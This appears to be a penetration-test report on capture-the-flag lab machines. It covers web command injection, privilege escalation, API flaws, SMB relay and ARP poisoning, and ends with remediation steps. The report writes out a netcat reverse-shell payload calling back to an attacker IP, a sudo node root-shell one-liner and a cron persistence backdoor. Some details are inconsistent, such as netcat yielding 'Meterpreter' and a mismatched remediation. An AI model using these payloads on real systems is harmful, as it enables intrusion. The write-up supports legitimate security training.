# Full VAPT Engagement Report
## Target Environment: 
- Chronos VulnHub (192.168.17.133),
- Smag Grotto (TryHackMe)
- Responder (HackTheBox)
- Diva application
  

## Scope: 
- Web application
- API
- Privilege escalation
- Network
- Mobile

## Executive Summary
Comprehensive VAPT engagement identified critical risks across web, API, privilege escalation, and network layers. 
**Key findings:** Node.js Express RCE (CVSS 9.8), cron misconfiguration root privesc (CVSS 8.8), SMB relay NTLM theft, and OWASP API Top 10 violations (Information Disclosure, Path Traversal). Full system compromise achieved via chained exploits. Immediate patching and network hardening required. 
**Total risk score:** CRITICAL. Remediations provided with verification steps.

Attack Timeline (PTES Phases)
text
 Target          | Vulnerability          | PTES Phase      | Status
-----------------|-----------------|------------------------|---------
  192.168.17.133 | Express RCE (/date)    | Exploitation    | Success
  192.168.17.133 | Sudo node privesc      | Privilege Esc.  | Success
  192.168.17.133 | Cron backdoor          | Post-Exploitation | Success
  Responder      | SMB Relay (Responder)  | Network Attack  | Success
  Smag Grotto    | API                    | API Testing     | Success

# Technical Findings
## 1. Advanced Exploitation (Chronos: Express RCE)
CVSS: 9.8 (Critical)
Node.js Express /date?format= endpoint executed unsanitized user input via shell command. Payload ; nc 192.168.17.132 4444 -e /bin/bash yielded Meterpreter reverse shell.
Chain: Recon → injection → RCE.
Evidence: Meterpreter sysinfo/shell.
​
## 2. Privilege Escalation & Persistence
CVSS: 8.8 (High)
LinPEAS identified sudo node/npm privileges for imera user. sudo node -e 'child_process.spawn("/bin/sh")' achieved root. Cron backdoor /etc/cron.d/persist-backdoor ensured persistence.
Evidence: SUID enum, root shell, cron logs.

## 3. API Security Testing
CVSS: 8.1 (High)
Smag Grotto API labs confirmed OWASP API Top 10:

**Information Disclosure:** /api → Info Leak
**Path Traversal:** /api/v1/resources/book?show=
​
## 4. Network Protocol Attacks
CVSS: 7.5 (High)
Responder Lab SMB relay via Responder captured jake::I4F8.LOCAL NTLMv2 hash. Ettercap ARP poisoned victim ↔ gateway; Wireshark intercepted HTTP creds.
Evidence: Responder logs, ARP tables.

## 5. Mobile Pentesting (Simulation)
​Android‑x86 lab setup completed with ADB over TCP. jadx-gui static analysis prepared for insecure logging testing per OWASP. ​

# Risk Assessment
Finding	CVSS	Likelihood	Impact	Priority
Express RCE	9.8	High	Critical	Immediate
Sudo Privesc	8.8	High	High	Immediate
API Info-Disc	8.1	Medium Medium Medium
SMB Relay	7.5	Medium	High	High
Cron Backdoor	7.2	Medium	High	High
Overall Risk: CRITICAL – chained exploits yield full domain compromise.

Phase 1: [WEB]
□ Patch Express >1.1.9-alpha.3 (file upload sanitization)
□ Remove sudo node/npm privileges (sudoers cleanup)
□ Delete /etc/cron.d/persist-backdoor, audit all crontabs
□ Deploy WAF (ModSecurity OWASP CRS) blocking command injection

Phase 2: [WEB]
□ API allowlist validation (BOLA, GraphQL introspection block)
□ Enable SMB signing, disable LLMNR/NBT-NS (GPO)
□ Ettercap countermeasures: ARP inspection/DHCP snooping
□ Mobile: MobSF + Frida for runtime hooks[file:244]

[!NOTE] : Required Imediate actions
